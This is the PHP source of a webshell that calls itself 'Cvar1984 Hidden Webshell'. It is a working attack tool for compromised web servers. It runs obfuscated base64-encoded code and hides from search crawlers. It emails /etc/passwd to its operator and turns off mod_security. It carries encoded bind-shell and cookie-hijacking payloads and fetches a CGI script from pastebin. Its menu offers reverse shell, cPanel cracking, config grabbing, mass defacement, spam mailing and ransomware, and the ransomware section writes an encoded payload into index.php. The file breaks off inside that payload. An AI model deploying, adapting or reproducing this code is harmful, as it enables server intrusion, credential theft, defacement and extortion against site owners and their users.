<?php
@session_start();
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '999999999M');
@set_time_limit(0);
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("safe_mode");
@ignore_user_abort(FALSE);
@ini_set('zlib.output_compression', 'Off');
eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
function Zip($source, $destination) {
    if(!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }
    $zip = new ZipArchive();
    if(!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }
    $source = str_replace('\\', '/', realpath($source));
    if(is_dir($source) == true) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        foreach($files as $file) {
            $file = str_replace('\\', '/', realpath($file));
            if(is_dir($file) == true) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if(is_file($file) == true) {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    } else if(is_file($source) == true) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }
    return $zip->close();
}
if(isset($_GET['zip'])) {
    $src = $_GET['zip'];
    $dst = getcwd() . "/" . basename($_GET['zip']) . ".zip";
    if(Zip($src, $dst) != false) {
        $filez = file_get_contents($dst);
        header("Content-type: application/octet-stream");
        header("Content-length: " . strlen($filez));
        header("Content-disposition: attachment;
filename=\"" . basename($dst) . "\";");
        echo $filez;
    }
    exit;
}
@error_reporting(4);
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array(
        "Google",
        "Slurp",
        "MSNBot",
        "ia_archiver",
        "Yandex",
        "Rambler"
    );
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />";
echo "
<style>
.kedip {
-webkit-animation-name: blinker;
-webkit-animation-duration:3s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;
 
-moz-animation-name: blinker;
-moz-animation-duration:2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;
 
 animation-name: blinker;
 animation-duration:3s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;
}
@-moz-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
@-webkit-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
@keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
 input {
 font-size:11px;
 background:#191919;
 color:yellow;
 margin:0 4px;
 border:1px solid #008080;
 }
 .hidden {
	background:white;
	border:1px solid white;
	color:white;
	}
	td {
	border-radius:5px;
	font-size:11px;
	}
	.header {
		size:25px;
		color:yellow; 
		}
    .go {
		height:50px;
		width:50px;
		float:left;
		margin-right:10px;
		display:none;
		background-color:#090;
		}
    .input_big {
		width:75px;
		height:30px;
		background:#191919;
		color:yellow;
		margin:0 4px;
		border:1px solid #222222;
		font-size:17px;
		}
    hr { border:1px solid #222222; }
    #meunlist {
		width:auto;
		height:auto;
		font-size:12px;
		font-weight:bold;
		}
    #meunlist ul {
		padding-top:5px;
		padding-right:5px;
		padding-bottom:7px;
		padding-left:2px;
		text-align:center;
		list-style-type:none;
		margin:0px;
		}
    #meunlist li {
		margin:0px;
		padding:0px;
		display:inline;
		}
    #meunlist a {
		font-size:14px;
		text-decoration:none;
		font-weight:bold;
		color:yellow;
		clear:both;
		width:100px;
		margin-right:-6px;
		padding-top:3px;
		padding-right:15px;
		padding-bottom:3px;
		padding-left:15px;
		}
    #meunlist a:hover { background: #333; color:#008080; }
    .menubar {
		-moz-border-radius:10px;
		border-radius:10px;
		border:1px solid #008080;
		padding:4px 8px; 
		line-height:16px; 
		background:#111111;
		color:#aaa; 
		margin:0 0 8px 0;
		}
    .menu { font-size:25px; color:#008080 }
    .textarea_edit,textarea{
		background-color:#111111; 
		border:1px groove #333;
		color:lime;
		width:383px;
		height:400px;
		font-size:15px;
		text-decoration:none; 
		border:1px dashed #333;
		}
    .input_butt {
		font-size:11px;
		background:#191919; 
		color:#4C83AF;
		margin:0 4px;
		border:1px solid #222222;
		}
    #result {
		-moz-border-radius:10px;
		border-radius:10px;
		border:1px solid #008080; 
		padding:4px 8px; 
		line-height:16px; 
		background:#111111;
		color:#aaa; margin:0 0 8px 0;
		min-height:100px;
		}
    .table {
    	width:100%;
    	padding:4px 0;
    	color:#888;
    	font-size:15px;
    	}
    .table a {
    	text-decoration:none;
    	color:yellow;
    	font-size:15px;
    	}
    .table a:hover {
    	text-decoration:underline;
    	}
    .table td {
		border-bottom:1px solid #222222;
		padding:0 8px;
		line-height:24px; 
		vertical-align:top;
		}
    .table th {
		padding:3px 8px;
		font-weight:normal; 
		background:#222222;
		color:#555; }
    .table tr:hover { background:#181818; }
    .tbl{
		width:100%;
		padding:4px 0;
		color:#888;
		font-size:15px;
		text-align:center;
		}
    .tbl a {
		text-decoration:none;
		color:yellow;
		font-size:15px;
		vertical-align:middle;
		}
    .tbl a:hover { text-decoration:underline; }
    .tbl td {
		border-bottom:1px solid #222222;
		padding:0 8px;
		line-height:24px;  
		vertical-align:middle;
		width:300px;
		}
    .tbl th {
		padding:3px 8px;
		font-weight:normal;
		background:#222222;
		color:#555;
		vertical-align:middle;
		}
    .tbl td:hover { background:#181818; }
    #alert { position: relative; }
    #alert:hover:after { background: hsla(0,0%,0%,.8);
	border-radius:3px;
	color:#f6f6f6;
	content:'Close';
	font:bold 12px/30px
	sans-serif;
	height:30px;
	left:50%;
	margin-left:-60px;position:absolute;
	text-align:center;
	top:50px;
	width:120px;
	}
    #alert:hover:before {
		border-bottom:10px solid hsla(0,0%,0%,.8);
		border-left:10px solid transparent;
		border-right:10px solid transparent;
		content:'';
		height: 0;
		left:50%;
		margin-left:-10px;
		position:absolute;
		top:40px;
		width:0;
		}
    #alert:target { display: none; }
    .alert_red {
		animation:alert 1s ease forwards;background-color:#c4453c;
		background-image:linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;
		box-shadow:0 5px 0 hsla(0,0%,0%,.1);
		color:#f6f6f6;
		display:block;
		font:bold 16px/40px sans-serif;
		height:40px;
		position:absolute;
		text-align:center;
		text-decoration:none;
		top:-45px;
		width:100%;
		}
    .alert_yellow {
		animation:alert 1s ease forwards;
		background-color:#43CD80;
		background-image:linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;
		box-shadow:0 5px 0 hsla(0,0%,0%,.1);
		color:#f6f6f6;display:block;
		font:bold 16px/40px sans-serif;height:40px;
		position:absolute;text-align:center;
		text-decoration:none;
		top:-45px;
		width:100%;
		}
    @keyframes alert {0% { opacity: 0; }50% { opacity: 1; }100% { top: 0; }}
    #divAlert { background-color:yellow; color:red;}
    </style>
	<div id=divAlert></div>";
if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
    if($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
        print '<script>document.cookie="user=' . $_POST["usrname"] . ';";document.cookie="pass=' . md5($_POST["passwrd"]) . ';";</script>';
        if($email != "") {
            mail_alert();
        }
    } else {
        if($_POST['usrname']) {
            print '<script>alert("Wrong Username or password");</script>';
        }
        echo '
<h1>Permission Denied</h1>
<p>You don t have permission to access the this page.</p>
<form method="post">

<input class="hidden" type="password" size="30" name="passwrd" value="" onfocus="if (this.value == \'password\')
this.value = \'\';">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<input type="hidden" size="30" name="usrname" value="Cvar1984" onfocus="if (this.value == \'username\'){this.value = \'\';}">
</form>';
        exit;
    }
}
$color_g   = "yellow";
$color_b   = "4C83AF";
$color_bg  = "#111111";
$color_hr  = "#222";
$color_wri = "yellow";
$color_rea = "yellow";
$color_non = "red";
$path      = $_GET['path'];
$sep       = "/";
$date      = date('d-M-Y H:i');
if(strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $os  = "win";
    $sep = "\\";
    $ox  = "Windows";
} else {
    $os = "nix";
    $ox = "Linux";
}
$self              = $_SERVER['PHP_SELF'];
$srvr_sof          = $_SERVER['SERVER_SOFTWARE'];
$your_ip           = $_SERVER['REMOTE_ADDR'];
$srvr_ip           = $_SERVER['SERVER_ADDR'];
$admin             = $_SERVER['SERVER_ADMIN'];
$s_php_ini         = "safe_mode=OFF
disable_functions=NONE";
$ini_php           = "
<?php
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>";
$s_htaccess        = "
<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>";
$s_htaccess_pl     = "
Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl";
$sym_htaccess      = "Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
Require None
Satisfy Any";
$sym_php_ini       = "
safe_mode=OFF
disable_functions=NONE";
$forbid_dir        = "Options -Indexes";
$cookie_highjacker = "rVVdc5pAFH13xv9wh3Eipq22M3miasaJGGmNWsS2mU6HQVyEFlnCLkk7If+9d8EPCKFtpuVB2d1z7z177gf1Wvc8dMN6rXP6av/AJQlIZHGyBouBBaEVcaAOaNOhPninGWNYjNXJBMKIfiM2h53Zaadec+LA5h4N0AXX5nKrXruv1wAfzwF5QzgJbmVpbBhz82KiqVPD1OZSC05OgPHIthixt2El7CVIcfA9oHeB1GplXnfOxdPwQuhBle3bDPiQ/RGfkTKjz+Zopn8a6EN1KN5+z6sEfja7koc/cNTVq5mhmoPhsJpaAfMcRgXDCiIeY4TLDXOh6h9V/UszZ9P8mjKqOHtEtgL1N3QrTMuEK+wPEYoWEeFxFMiIEXd/yJWxTzdDi1u5QkbQhG56kk0Dx9vE2CaIY23+g++dNmxKv3ukQPfDUtWvzYWha9PLA99GRDYe4yQyNz5dWT5DE3lFqd8CL/BMzI3cPEJSRHOfHJGQkn2rmNWCSHvDNJ0ZbNejeHDgszVDis3+hNLzmW4cmccMo1obEhSxaWEvcWUOLrH1cje9YdzcEu7SdcHgSjXGs2Feka3pUvYkg/FskfdIHBKRqBxeV0eqrh6rorHGSdYTPyBLPqwXYpSN4BpcxVMYDA713sBk9xwakkCWsixLWJPWC+mokFA9RNXNrcVtV5Y6K5dvVx0PgZlFC5IESgi/ACkXtxPGnMkiPgbU5kqanwSE5EouKwkICZScSgkMRA6UQkISyFRVirIngMooR+ESGA4M9R4UeMg0wp2L2ey9pirHGu6uov5TA+F/XuGf7pBeQqm+QBA8pu/YPmUkpbrr9kOT45LYLgWpXuuKtPW7LrHWfVxxj/ukf/b6DKaUw4jGwbrbyTbxtJPCuiu6/imW7pt+DoUr3Av7hktw0NzEhIkP61KfgNQuFDnOiIVhLnUNJ2Zbgjv89gboxhFuAGcRdz0GKNEtidrdTpgGTkOKwXOOy18=";
$bind_perl         = "rZJdb5swFIavi8R/OHXTFSSmZJu2i0abxAjtWApEQLtNVYUoOK1VgimmmqIq/30+dpKmmna1+Aq/7/Fzvjg6HD6JbnjLmmFLuxre/jYN0zjax5EY+P+jMee0oV3R0woKAQW0RdcDn0MQTRL3e5B9g5A1DNJ7WtfwdQlKm84+fhrBdRaf3Wwwe6lmP7MxjSdBIeXlA+3H+uLxZs7u5GXAhcr2GQZae+aiKRZ0hV7Lu/5AOm5yfnU9ulFSx3sutTvaq8/bJUZbJ33ZntgYUC4qaZO6rcgYUw/EUvR0gZpavbjXOptbmJs+AgnTH6z58J7YpvFsGgfrF7IkcuzFYTrzvWMYTvHZShFHWK3MozhCtWWlfnLlJw7MzvIg8jMH0tib5mmW+G7ogC7bBt5BxSgQ/eh0cIhQQXu88/aFksYXOQI0KE/8y9R3JxPptEX5YJGaOPDO3uFtEaegobLVaotDr6iqLmeNpYbqyN8Jebkb/drB4KMNoGZyCM1ORaH704uj6CVaR2ziTWPOO2ssW8VMckJFWVLZkncR+BG2oUD2GMqa4w+g5PXEeYuZskkQOUC+vNEewXVurfgy+6fnJ8lfnt6htd6lklRineb1XbJfCxKIwuoP";
if($safemode == "On") {
    echo "<div id='alert'><a class=\"alert_yellow\"
href=\"#alert\">Safe Mode : <font
color=red>ON</font></a></div>";
} else {
    echo "<div id='alert'><a class=\"alert_yellow\"
href=\"#alert\">Safe Mode : <font
color=lime>OFF</font></a></div>";
}
echo "<script
src=\"http://code.jquery.com/jquery-latest.js\"></script><script>$(\"#alert\").delay(2000).fadeOut(300);</script>";
echo "<title>Cvar1984 Hidden Webshell</title>
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
<body bgcolor=black>
<div id=result>
<table>
<tbody>
<tr>
<td style='border-right:1px solid #104E8B;' width=\"300px;\">
<div style='text-align:center;'>
<a href='?' style='text-decoration:none;'>
<pre onkeydown=return false; onmousedown=return false; class=kedip style='color:lime;'>
_________                     ____ ________  ______     _____  
\_   ___ \___  _______ ______/_   /   __   \/  __  \   /  |  | 
/    \  \/\  \/ /\__  \\_  __ \   \____     />      <  /   |  |_
\     \____\   /  / __ \|  | \/   |  /    //   --   \/    ^   /
 \______  / \_/  (____  /__|  |___| /____/ \______  /\____   | 
        \/            \/                          \/      |__| 
	</pre>
</a><font
color=yellow>=========== BlackHole Security ===========</font>
</div></td>
<td>
<div class=\"header\">OS</font>
<font color=\"#666\" >:</font>
" . $ox . " </font> <font color=\"#666\" >|</font>
" . php_uname() . "<br>
 Your IP : <font color=red>" . $your_ip . "</font>
<font color=\"#666\" >|</font>
 Server IP : <font color=red>" . $srvr_ip . "</font>
 <font color=\"#666\" > | </font>
  Admin <font color=\"#666\" > : </font>
 <font color=red> {$admin} </font><br>MySQL <font color=\"#666\" > : </font>";
echo mysqlx();
echo "<font color=\"#666\" > |
</font> Oracle <font color=\"#666\" > :
</font>";
echo oraclesx();
echo "<font color=\"#666\" > |
</font> MSSQL <font color=\"#666\" > :
</font>";
echo mssqlx();
echo "<font color=\"#666\" > |
</font> PostGreySQL <font color=\"#666\" > :
</font>";
echo postgreyx();
echo "<br />cURL <font color=\"#666\"
> : </font>";
echo curlx();
echo "<font color=\"#666\" > |
</font>Total Space<font color=\"#666\" > :
</font>";
echo disc_size();
echo "<font color=\"#666\" > |
</font>Free Space<font color=\"#666\" > :
</font>";
echo freesize();
echo "<br />Software<font
color=\"#666\" > : </font><font
color=red>{$srvr_sof}</font>
<font color=\"#666\">
| </font> PHP<font color=\"#666\" > :
</font><a style='color:red; text-decoration:none;' target=_blank href=?phpinfo>" . phpversion() . "</a>
<br />Disabled Functions<font
color=\"#666\"
> : </font></font><font color=red>";
echo disabled_functns() . "</font><br />";
if($os == 'win') {
    echo "Drives <font color=\"#666\" > : </font>";
    echo drivesx();
} else {
    echo "r00t Exploit
<font color=\"#666\" > : </font>
<font color=red>";
    echo r00t_exploit() . "</font>";
}
echo "
</div>
</td>
</tr>
</tbody>
</table></div>";
echo "
<div class='menubar'>
<div id=\"meunlist\" align=center>
<ul>
<li>[<a href=\"?ngindex\">Priv Index</a>]</li>
<li>[<a href=\"?cgi\">CGI Telnet</a>]</li>
<li>[<a href=\"?rs\">Reverse Shell</a>]</li>
<li>[<a href=\"?jembud2\">b374k 2</a>]</li>
<li>[<a href=\"?idx\">IndoXploit</a>]</li>
</ul><ul>
<li>[<a href=\"?musik\">Sound Cloud</a>]</li>
<li>[<a href=\"?rctm\">Realtime DDOS Map</a>]</li>
<li>[<a href=\"?encodefile\">Encode/Decode</a>]</li>
<li>[<a href=\"?path={$path}&amp;safe_mod\">Safe Mode Fucker</a>]</li>
<li>[<a href=\"?path={$path}&amp;forbd_dir\">Dir Listing Forbidden</a>]</li>
</ul><ul>
<li>[<a href=\"?massmailer\">Mass Mailer</a>]</li>
<li>[<a href=\"?cpanel_crack\">cPanel Crack</a>]</li>
<li>[<a href=\"?sh311_scanner\">Backdoor Scan</a>]</li>
<li>[<a href=\"?server_exploit_details\">Exploit Details</a>]</li>
<li>[<a href=\"?remote_server_scan\">Remote Server Scan</a>]</li>
</ul><ul>
<li>[<a href=\"?remotefiledown\">Remote File Downloader</a>]</li>
<li>[<a href=\"?hexenc\">Hex Encode/Decode</a>]</li>
<li>[<a href=\"?ftp_anon_scan\">FTP Anonymous Access Scaner</a>]</li>
<li>[<a href=\"?path={$path}&amp;mass_xploit\">Mass Deface</a>]</li>
<li>[<a href=\"?config_grab\">Config Grabber</a>]</li>
</ul><ul>
<li>[<a href=\"?symlink\">SymLink</a>]</li>
<li>[<a href=\"?cookiejack\">Cookie Hijack</a>]</li>
<li>[<a href=\"?sshman\">Secure Shell</a>]</li>
<li>[<a href=\"?path={$path}&c0de_inject\">Mass Overwrite</a>]</li>
<li>[<a href=\"?ftpman\">FTP Manager</a>]</li>
</ul><ul>
<li>[<a href=\"?ganteng\">Ransomeware</a>]</li>
<li>[<a href=\"?logger\">Check Steganologer</a>]</li>
<li>[<a href=\"?adminer\">Adminer</a>]</li>
<li>[<a href=\"?phpinfo\">PHP Info</a>]</li>
<li>[<li class=kedip><a href=\"?killme\"><font color='#008080'>Suicide</font></a></li>]</li>
</ul>
</div>
</div>";
function alert($alert_txt) {
    echo "<div id=divAlert>" . $alert_txt . "</div>";
    echo "<script>alert('" . $alert_txt . "');window.location.href='?';</script>";
}
function disabled_functns() {
    if(!@ini_get('disable_functions')) {
        echo "None";
    } else {
        echo @ini_get('disable_functions');
    }
}
function drivesx() {
    foreach(range('A', 'Z') as $drive) {
        if(is_dir($drive . ':\\')) {
            echo "<a> [<a style='color:aqua; text-decoration:none;' href='?path=" . $drive . ":\\'> " . $drive . " </a>] </a>";
        }
    }
}
function mail_alert() {
    global $email;
    $passwd       = file_get_contents('/etc/passwd');
    $shell_path   = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
    $subject      = "Logs";
    $from         = "From:Cvar1984";
    $content_mail = "URL : $shell_path\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n**********\n$passwd\n**********\nBy Cvar1984";
    mail($email, $subject, $content_mail, $from);
}
function filesizex($size) {
    if($size >= 1073741824)
        $size = round(($size / 1073741824), 2) . " GB";
    elseif($size >= 1048576)
        $size = round(($size / 1048576), 2) . " MB";
    elseif($size >= 1024)
        $size = round(($size / 1024), 2) . " KB";
    else
        $size .= " B";
    return $size;
}
function disc_size() {
    echo filesizex(disk_total_space("/"));
}
function freesize() {
    echo filesizex(disk_free_space("/"));
}
function file_perm($filz) {
    if($m = fileperms($filz)) {
        $p = '';
        $p .= ($m & 00400) ? 'r' : '-';
        $p .= ($m & 00200) ? 'w' : '-';
        $p .= ($m & 00100) ? 'x' : '-';
        $p .= ($m & 00040) ? 'r' : '-';
        $p .= ($m & 00020) ? 'w' : '-';
        $p .= ($m & 00010) ? 'x' : '-';
        $p .= ($m & 00004) ? 'r' : '-';
        $p .= ($m & 00002) ? 'w' : '-';
        $p .= ($m & 00001) ? 'x' : '-';
        return $p;
    }
}
function mysqlx() {
    if(function_exists('mysql_connect')) {
        echo "<font color='aqua'>Enabled</font>";
    } else {
        echo "<font color='#008080'>Disabled</font>";
    }
}
function oraclesx() {
    if(function_exists('oci_connect')) {
        echo "<font color='aqua'>Enabled</font>";
    } else {
        echo "<font color='#008080'>Disabled</font>";
    }
}
function mssqlx() {
    if(function_exists('mssql_connect')) {
        echo "<font color='aqua'>Enabled</font>";
    } else {
        echo "<font color='#008080'>Disabled</font>";
    }
}
function postgreyx() {
    if(function_exists('pg_connect')) {
        echo "<font color='aqua'>Enabled</font>";
    } else {
        echo "<font color='#008080'>Disabled</font>";
    }
}
function strip($filx) {
    if(!get_magic_quotes_gpc())
        return trim(urldecode($filx));
    return trim(urldecode(stripslashes($filx)));
}
function curlx() {
    if(function_exists('curl_version')) {
        echo "<font color='aqua'>Enabled</font>";
    } else {
        echo "<font color='#008080'>Disabled</font>";
    }
}
function filesize_x($filex) {
    $f_size = filesizex(filesize($filex));
    return $f_size;
}
function rename_ui() {
    $rf_path = $_GET['rename'];
    echo "<div id=result>
	<center><h2>Rename</h2><hr><p><br><br>
	<form method='GET'><input type=hidden name='old_name' size='40' value=" . $rf_path . ">New Name : <input name='new_name' size='40' value=" . basename($rf_path) . ">
	<input type='submit' value='O'></form></p><br><br><hr><br><br></center></div>";
}
function cgi() {
    if(!file_exists('.config')) {
        mkdir('.config', 0755);
    }
    $file_cgi   = ".config/cgi.izo";
    $isi_htcgi  = "
AddHandler cgi-script .izo
Options -Indexes";
    $htcgi      = fopen(".config/.htaccess", "w+");
    $cgi_script = file_get_contents("https://pastebin.com/raw/MUD0EPjb");
    $cgi        = fopen($file_cgi, "w+");
    fwrite($cgi, $cgi_script);
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
    echo "<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
}
function rctm() {
    echo "<iframe width='100%' height='100%' src='https://threatmap.fortiguard.com' frameborder='0'>";
}
function soundcloud() {
    echo "<iframe width='100%' height='100%' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
}
function gantengware() {
    echo "
<style type='text/css'>
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel='stylesheet' type='text/css' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css'>
</head>
<body>
<div class='result'>";
    error_reporting(0);
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    class deRanSomeware {
        public function shcpackInstall() {
            if(!file_exists(".htabak")) {
                rename(".htaccess", ".htabak");
                if(fwrite(fopen('.htaccess', 'w+'), "\rDirectoryIndex index.php\r\nErrorDocument 404 /index.php")) {
                    echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
                }
                if(file_put_contents("index.php", gzinflate(base64_decode("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